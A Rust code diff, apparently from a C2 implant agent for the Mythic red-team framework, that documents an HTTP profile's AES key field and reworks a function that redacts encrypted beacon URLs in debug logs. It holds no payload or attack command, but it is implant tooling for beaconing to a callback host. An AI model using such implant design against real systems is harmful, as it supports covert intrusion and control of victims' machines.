@@ -10,6 +10,8 @@ use super::C2Transport;
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct HttpProfile {
+    /// Base64-encoded 32-byte AES key, or `None` to fall back to the
+    /// profile-default Mythic generates at build time.
     pub aes_psk: Option<String>,
     pub callback_host: String,
     pub callback_interval: u64,
@@ -58,19 +60,25 @@ fn url_encode(s: &str) -> String {
 /// contains the AES-encrypted payload, which is deterministic per (PSK, IV)
 /// pair — printing it in full would let observers correlate beacons without
 /// holding the PSK.
-#[cfg(debug_assertions)]
+///
+/// In release builds the function is a no-op (the URL is logged verbatim,
+/// but the only callers are gated on `DEBUG.load()`, so a release build
+/// never invokes it). Keeping a non-`#[cfg(debug_assertions)]` body
+/// future-proofs against a caller being added without remembering to gate
+/// the function.
 fn redact_url(url: &str) -> String {
-    if let Some(q) = url.find('?') {
-        let path = &url[..q];
-        let qs = &url[q + 1..];
-        if qs.len() <= 64 {
-            format!("{path}?<{}_bytes_redacted>", qs.len())
-        } else {
-            format!("{path}?{}…<{} bytes redacted>", &qs[..48], qs.len())
+    #[cfg(debug_assertions)]
+    {
+        if let Some(q) = url.find('?') {
+            let path = &url[..q];
+            let qs = &url[q + 1..];
+            if qs.len() <= 64 {
+                return format!("{path}?<{}_bytes_redacted>", qs.len());
+            }
+            return format!("{path}?{}…<{} bytes redacted>", &qs[..48], qs.len());
         }
-    } else {
-        url.to_string()
     }
+    url.to_string()
 }
 
 impl HttpProfile {
